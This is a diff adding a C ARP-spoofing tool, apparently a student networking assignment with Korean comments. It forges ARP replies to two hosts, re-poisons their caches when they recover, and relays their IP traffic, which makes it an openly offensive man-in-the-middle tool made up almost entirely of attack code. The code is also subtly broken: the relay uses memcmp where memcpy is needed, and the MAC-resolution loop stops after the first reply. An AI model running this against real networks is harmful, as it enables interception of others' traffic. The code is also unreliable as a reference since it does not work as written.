@@ -1,0 +1,397 @@
+#include <string.h>
+#include <stdlib.h>
+#include <pcap.h>
+#include "ethheader.h"
+#include "arpframe.h"
+#include "ipheader.h"
+#include <arpa/inet.h>
+#include <ifaddrs.h>
+#include <sys/ioctl.h>
+#include <net/if.h>
+#include <netpacket/packet.h> 
+#include <net/ethernet.h>
+
+
+
+#pragma pack(push, 1)
+typedef struct _EtherArpPacket
+{
+    ethheader ETHER; 
+    arpframe ARP; 
+}EtherArpPacket;
+
+typedef struct _EtherIPPacket
+{
+    ethheader ETHER;
+    ipheader IP;
+}EtherIPPacket;
+
+typedef struct _IPpair
+{
+    char* sender_ip_str;
+    char* target_ip_str;
+    uint32_t sender_ip;
+    uint32_t target_ip;
+}IPpair;
+#pragma pack(pop)
+
+void usage() 
+{
+	printf("syntax: send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
+	printf("sample: send-arp wlan0 192.168.10.2 192.168.10.1\n");
+}
+
+// ARP 포이즈닝 패킷(reply)를 조립하고 보내는 함수. 인자 전달시 주의.
+void send_arp_poisoning(pcap_t* handle, 
+                        uint8_t* src_mac, uint8_t* dst_mac, 
+                        uint8_t* sender_mac, uint32_t sender_ip, 
+                        uint8_t* target_mac, uint32_t target_ip) 
+{
+    EtherArpPacket packet;
+
+    // Ethernet Header
+    memcpy(packet.ETHER.ether_dstMAC, dst_mac, 6);   
+    memcpy(packet.ETHER.ether_srcMAC, src_mac, 6);   
+    packet.ETHER.ether_next_type = htons(0x0806);
+
+    // ARP Payload
+    packet.ARP.Hardware_Type = htons(1);
+    packet.ARP.Protocol = htons(0x0800);
+    packet.ARP.Hardware_Length = 6;
+    packet.ARP.Protocol_Length = 4;
+    packet.ARP.Operation = htons(2);                
+
+    memcpy(packet.ARP.Sender_MAC, sender_mac, 6);      
+    packet.ARP.Sender_Protocol_Addr = htonl(sender_ip); 
+    memcpy(packet.ARP.Target_MAC, target_mac, 6);
+    packet.ARP.Target_Protocol_Addr = htonl(target_ip);
+
+    if (pcap_sendpacket(handle, (const unsigned char *)&packet, sizeof(packet)) != 0) 
+    {
+        fprintf(stderr, "[!] Error sending poisoning packet: %s\n", pcap_geterr(handle));
+    }
+}
+
+int main(int argc, char* argv[])
+{
+    if (argc < 4)
+    {
+        usage();
+        return -1;
+    }
+    char errbuf[PCAP_ERRBUF_SIZE];
+    char* dev = argv[1];
+
+    int pair_count = (argc -2) / 2;
+    IPpair pairs[pair_count];
+
+    for (int i = 0; i < pair_count ; i++)
+    {
+        pairs[i].sender_ip_str = argv[2 + i*2];
+        pairs[i].target_ip_str = argv[2 + i*2 + 1];
+
+        pairs[i].sender_ip = ntohl(inet_addr(pairs[i].sender_ip_str)); 
+        pairs[i].target_ip = ntohl(inet_addr(pairs[i].target_ip_str));
+    }
+    
+
+    pcap_t* pcap = pcap_open_live(dev, 65535, 1, 1000, errbuf); //점보 프레임
+    
+    if(pcap == NULL)
+    {
+        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
+		return -1;
+    }
+
+
+    //여기는 나의(공격자의) MAC 주소와 ip 주소 가져오는 부분
+    unsigned char my_MAC[6];
+    uint32_t my_ip;
+
+    struct ifaddrs *ifap, *ifa;
+    struct sockaddr_in *sa;
+
+    if (getifaddrs(&ifap) == 0) {
+        for (ifa = ifap; ifa != NULL; ifa = ifa->ifa_next) {
+            if (ifa->ifa_addr == NULL) continue;
+
+            // 1. MAC 주소 가져오기 (리눅스 방식: AF_PACKET)
+            if (strcmp(ifa->ifa_name, dev) == 0 && ifa->ifa_addr->sa_family == AF_PACKET) {
+                struct sockaddr_ll *sll = (struct sockaddr_ll *)ifa->ifa_addr;
+                if (sll->sll_halen == 6) { // MAC 주소 길이는 6바이트
+                    memcpy(my_MAC, sll->sll_addr, 6);
+                    printf("Success! My MAC: %02x:%02x:%02x:%02x:%02x:%02x\n",
+                        my_MAC[0], my_MAC[1], my_MAC[2], my_MAC[3], my_MAC[4], my_MAC[5]);
+                }
+            }
+
+            // 2. IP 주소 가져오기 (AF_INET은 리눅스/macOS 공통)
+            if (strcmp(ifa->ifa_name, dev) == 0 && ifa->ifa_addr->sa_family == AF_INET) {
+                sa = (struct sockaddr_in *)ifa->ifa_addr;
+                my_ip = ntohl(sa->sin_addr.s_addr);
+            }
+        }
+        freeifaddrs(ifap);
+    } else {
+        perror("getifaddrs error");
+        return -1;
+    }    
+    //여기서부터 pair 1쌍씩에 대해 반복문 수행
+   
+    for (int i = 0; i < pair_count ; i++)
+    {
+        //우선 sender1의 맥 주소를 알아내기 위해 sender와 arp request&reply 주고받기
+        //target1의 맥 주소를 알아내기 위해 arp request 보내는 코드 추가
+        //arp request to find sender1 MAC address
+        EtherArpPacket arprequest_packet;
+    
+        memset(arprequest_packet.ETHER.ether_dstMAC, 0xFF, 6);
+        memcpy(arprequest_packet.ETHER.ether_srcMAC, my_MAC, 6);
+        arprequest_packet.ETHER.ether_next_type = htons(0x0806);
+        
+        arprequest_packet.ARP.Hardware_Type = htons(1);
+        arprequest_packet.ARP.Protocol = htons(0x0800);
+        arprequest_packet.ARP.Hardware_Length = 6;
+        arprequest_packet.ARP.Protocol_Length = 4;
+        arprequest_packet.ARP.Operation = htons(1);
+        memcpy(arprequest_packet.ARP.Sender_MAC, my_MAC, 6);
+        arprequest_packet.ARP.Sender_Protocol_Addr = htonl(my_ip);
+        memset(arprequest_packet.ARP.Target_MAC, 0x00, 6);
+        arprequest_packet.ARP.Target_Protocol_Addr = htonl(pairs[i].sender_ip); 
+
+        
+        if (pcap_sendpacket(pcap, (unsigned char*)&arprequest_packet, sizeof(arprequest_packet)) != 0)
+        {
+        fprintf(stderr, "Error sending the packet: %s\n", pcap_geterr(pcap));
+        }
+        printf("[*] Sent ARP Request to find SENDER MAC \n");
+
+        //arp request to find target1 MAC address
+        memset(arprequest_packet.ETHER.ether_dstMAC, 0xFF, 6);
+        memcpy(arprequest_packet.ETHER.ether_srcMAC, my_MAC, 6);
+        arprequest_packet.ETHER.ether_next_type = htons(0x0806);
+        
+        arprequest_packet.ARP.Hardware_Type = htons(1);
+        arprequest_packet.ARP.Protocol = htons(0x0800);
+        arprequest_packet.ARP.Hardware_Length = 6;
+        arprequest_packet.ARP.Protocol_Length = 4;
+        arprequest_packet.ARP.Operation = htons(1); 
+        memcpy(arprequest_packet.ARP.Sender_MAC, my_MAC, 6);
+        arprequest_packet.ARP.Sender_Protocol_Addr = htonl(my_ip);
+        memset(arprequest_packet.ARP.Target_MAC, 0x00, 6);
+        arprequest_packet.ARP.Target_Protocol_Addr = htonl(pairs[i].target_ip); 
+
+        
+        if (pcap_sendpacket(pcap, (unsigned char*)&arprequest_packet, sizeof(arprequest_packet)) != 0) 
+        {
+        fprintf(stderr, "Error sending the packet: %s\n", pcap_geterr(pcap));
+        }
+        printf("[*] Sent ARP Request to find TARGET MAC \n");
+
+        
+
+        
+        //여기서부터 arp reply
+        //target mac 저장하는 코드 추가
+        
+        unsigned char sender_MAC[6];
+        unsigned char target_MAC[6];
+		while(1)
+        {
+            struct pcap_pkthdr* header;
+            const unsigned char* packet;
+            
+
+            int res = pcap_next_ex(pcap, &header, &packet); //pcap_next_ex 더 공부해보기
+            if(res == 0) continue;
+            if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) 
+            {
+                printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap));
+                break;
+            }
+            
+            EtherArpPacket* arpreply_packet = (EtherArpPacket*) packet;
+
+            
+
+            if(memcmp(arpreply_packet->ETHER.ether_dstMAC,my_MAC,6) != 0) continue; //Ethernet 수준에서 내(공격자) MAC주소로 온게 맞으면
+            if(arpreply_packet->ETHER.ether_next_type != ntohs(0x0806)) continue; //ARP 패킷만 통과시키기
+            if(arpreply_packet->ARP.Operation != ntohs(0x0002)) continue; //ARP 수준에서 Reply가 맞아야하고
+            if(arpreply_packet->ARP.Sender_Protocol_Addr == htonl(pairs[i].sender_ip))
+            {
+                if(memcmp(arpreply_packet->ARP.Target_MAC,my_MAC,6) != 0) continue; //ARP 수준에서 arp payload에 담긴 target MAC주소가 내 MAC 주소가 맞다면 통과시키기
+                memcpy(sender_MAC,arpreply_packet->ARP.Sender_MAC,6);
+                break;
+            } else if(arpreply_packet->ARP.Sender_Protocol_Addr == htonl(pairs[i].target_ip))
+                {
+                    if(memcmp(arpreply_packet->ARP.Target_MAC,my_MAC,6) != 0) continue;
+                    memcpy(target_MAC, arpreply_packet->ARP.Sender_MAC,6);
+                    break;
+                }
+            
+
+        }
+
+
+        //여기서부터 arp spoofing 패킷 만들기
+
+        //sender1한테 한번 보내놓기
+        send_arp_poisoning(pcap, my_MAC, sender_MAC, my_MAC, pairs[i].target_ip, sender_MAC, pairs[i].sender_ip);
+        //target1한테 한번 보내놓기
+        send_arp_poisoning(pcap, my_MAC, target_MAC, my_MAC, pairs[i].sender_ip, target_MAC, pairs[i].target_ip); 
+
+        
+        //여기서부터 arp poisoning 풀린걸 감지하면 re-infection해주는 부분 + relay 까지
+        unsigned char BROADCAST_MAC[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
+        uint16_t ARP_TYPE = 0x0806;
+        uint16_t IP_TYPE = 0x0800;
+        uint8_t relay_buf[10000];
+
+        while(1)
+        {
+            struct pcap_pkthdr* header;
+            const unsigned char* packet;
+            
+
+            int res = pcap_next_ex(pcap, &header, &packet);
+            if(res == 0) continue;
+            if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) 
+            {
+                printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap));
+                break;
+            }
+
+            EtherArpPacket* arp_detect_packet = (EtherArpPacket*) packet;
+            //////////////////////////////////////////////////////
+            //sender 관리
+
+            //1. sender1의 table이 만료되서 다시 target1 ip 맥주소를 얻기 위해
+            //arp request를 broadcats하는 경우
+            if(memcmp(arp_detect_packet->ETHER.ether_srcMAC,sender_MAC,6) == 0 &&
+                memcmp(arp_detect_packet->ETHER.ether_dstMAC,BROADCAST_MAC,6) == 0 &&
+                arp_detect_packet->ETHER.ether_next_type == htons(ARP_TYPE) &&
+                arp_detect_packet->ARP.Target_Protocol_Addr == htonl(pairs[i].target_ip)&&
+                arp_detect_packet->ARP.Operation == htons(0x01))
+            {
+                send_arp_poisoning(pcap, my_MAC, sender_MAC, my_MAC, pairs[i].target_ip, sender_MAC, pairs[i].sender_ip);
+                continue;
+            }
+
+            //2. sender1의 table이 만료되기 전에 target1 맥주소를 유지시키기 위해
+            //arp request를 unicast하는 경우(단, 아직은 감염되어있는 상태)
+            if(memcmp(arp_detect_packet->ETHER.ether_srcMAC,sender_MAC,6) == 0 &&
+                memcmp(arp_detect_packet->ETHER.ether_dstMAC,my_MAC,6) == 0 &&
+                arp_detect_packet->ETHER.ether_next_type == htons(ARP_TYPE) &&
+                arp_detect_packet->ARP.Target_Protocol_Addr == htonl(pairs[i].target_ip)&&
+                arp_detect_packet->ARP.Operation == htons(0x01))
+            {
+                send_arp_poisoning(pcap, my_MAC, sender_MAC, my_MAC, pairs[i].target_ip, sender_MAC, pairs[i].sender_ip);
+                continue;
+            }
+
+            //3,4,5. target1이 arp request를 broadcast하는 경우(sender1의 맥주소를 알아내기 
+            //위해서든 다른 놈의 맥주소를 알아내기 위해서든 관계 x)
+            //request든 reply든 무관하게 재감염시켜줘야함.
+            if(memcmp(arp_detect_packet->ETHER.ether_srcMAC,target_MAC,6) == 0 &&
+                memcmp(arp_detect_packet->ETHER.ether_dstMAC, BROADCAST_MAC, 6) == 0 &&
+                arp_detect_packet->ETHER.ether_next_type == htons(ARP_TYPE) &&
+                memcmp(arp_detect_packet->ARP.Sender_MAC,target_MAC,6) == 0 &&
+                arp_detect_packet->ARP.Sender_Protocol_Addr == htonl(pairs[i].target_ip))
+            {
+                send_arp_poisoning(pcap, my_MAC, sender_MAC, my_MAC, pairs[i].target_ip, sender_MAC, pairs[i].sender_ip);
+                continue;
+            }
+           
+            //6. target1이 arp table 엔트리 유지를 위해 sender1에게 unicast해버리면? -> 둘 다 감염시키자
+           
+           
+            //////////////////////////////////////////////////////////////////////////
+            //target 관리
+
+            //1. target1의 table이 만료되서 다시 sender1 ip 맥주소를 얻기 위해
+            //arp request를 broadcats하는 경우
+            if(memcmp(arp_detect_packet->ETHER.ether_srcMAC,target_MAC,6) == 0 &&
+                memcmp(arp_detect_packet->ETHER.ether_dstMAC,BROADCAST_MAC,6) == 0 &&
+                arp_detect_packet->ETHER.ether_next_type == htons(ARP_TYPE) &&
+                arp_detect_packet->ARP.Target_Protocol_Addr == htonl(pairs[i].sender_ip)&&
+                arp_detect_packet->ARP.Operation == htons(0x01))
+            {
+                send_arp_poisoning(pcap, my_MAC, target_MAC, my_MAC, pairs[i].sender_ip, target_MAC, pairs[i].target_ip);
+                continue;
+            }
+
+            //2. target1의 table이 만료되기 전에 sender1 맥주소를 유지시키기 위해
+            //arp request를 unicast하는 경우(단, 아직은 감염되어있는 상태)
+            if(memcmp(arp_detect_packet->ETHER.ether_srcMAC,target_MAC,6) == 0 &&
+                memcmp(arp_detect_packet->ETHER.ether_dstMAC,my_MAC,6) == 0 &&
+                arp_detect_packet->ETHER.ether_next_type == htons(ARP_TYPE) &&
+                arp_detect_packet->ARP.Target_Protocol_Addr == htonl(pairs[i].sender_ip)&&
+                arp_detect_packet->ARP.Operation == htons(0x01))
+            {
+                send_arp_poisoning(pcap, my_MAC, target_MAC, my_MAC, pairs[i].sender_ip, target_MAC, pairs[i].target_ip);
+                continue;
+            }
+
+            //3,4,5. sender1이 arp request를 broadcast하는 경우(target1의 맥주소를 알아내기 
+            //위해서든 다른 놈의 맥주소를 알아내기 위해서든 관계 x)
+            //request든 reply든 무관하게 재감염시켜줘야함.
+            if(memcmp(arp_detect_packet->ETHER.ether_srcMAC,sender_MAC,6) == 0 &&
+                memcmp(arp_detect_packet->ETHER.ether_dstMAC, BROADCAST_MAC, 6) == 0 &&
+                arp_detect_packet->ETHER.ether_next_type == htons(ARP_TYPE) &&
+                memcmp(arp_detect_packet->ARP.Sender_MAC,sender_MAC,6) == 0 &&
+                arp_detect_packet->ARP.Sender_Protocol_Addr == htonl(pairs[i].sender_ip))
+            {
+                send_arp_poisoning(pcap, my_MAC, target_MAC, my_MAC, pairs[i].sender_ip, target_MAC, pairs[i].target_ip);
+                continue;
+            }
+
+            //여기서부터 Relay
+            EtherIPPacket* relay_packet = (EtherIPPacket*) packet;
+
+            
+            if(ntohs(relay_packet->ETHER.ether_next_type) == IP_TYPE)
+            {   
+                //1. sender1 -> 나 -> target1 패킷을 relay 해주는 조건
+                if(memcmp(relay_packet->ETHER.ether_srcMAC, sender_MAC, 6) == 0 &&
+                    memcmp(relay_packet->ETHER.ether_dstMAC, my_MAC, 6) == 0 &&
+                    ntohl(relay_packet->IP.DstIP) != my_ip)
+                    {
+                        //ether 헤더에서 src_MAC을 my_MAC으로, dst_MAC을 target1 MAC으로 갈아끼워서 보내기.
+                        memcpy(relay_buf, packet, header->caplen);
+                        relay_packet = (EtherIPPacket*) relay_buf;
+                        memcmp(relay_packet->ETHER.ether_srcMAC, my_MAC, 6);
+                        memcmp(relay_packet->ETHER.ether_dstMAC, target_MAC, 6);
+
+                        pcap_sendpacket(pcap, relay_buf, header->caplen);
+                        
+                    }
+                
+                    
+                //2. target1 -> 나 -> sender1 패킷을 relay 해주는 조건
+                else if(memcmp(relay_packet->ETHER.ether_srcMAC, target_MAC, 6) == 0 &&
+                    memcmp(relay_packet->ETHER.ether_dstMAC, my_MAC, 6) == 0 &&
+                    ntohl(relay_packet->IP.DstIP) != my_ip)
+                    {
+                        //ether 헤더에서 src_MAC을 my_MAC으로, dst_MAC을 sender1 MAC으로 갈아끼워서 보내기.
+                        memcpy(relay_buf, packet, header->caplen);
+                        relay_packet = (EtherIPPacket*) relay_buf;
+                        memcmp(relay_packet->ETHER.ether_srcMAC, my_MAC, 6);
+                        memcmp(relay_packet->ETHER.ether_dstMAC, sender_MAC, 6);
+
+                        pcap_sendpacket(pcap, relay_buf, header->caplen);
+                        
+                    }
+            }
+
+            
+
+
+        }
+
+
+
+    }
+
+        
+    return 0;
+}
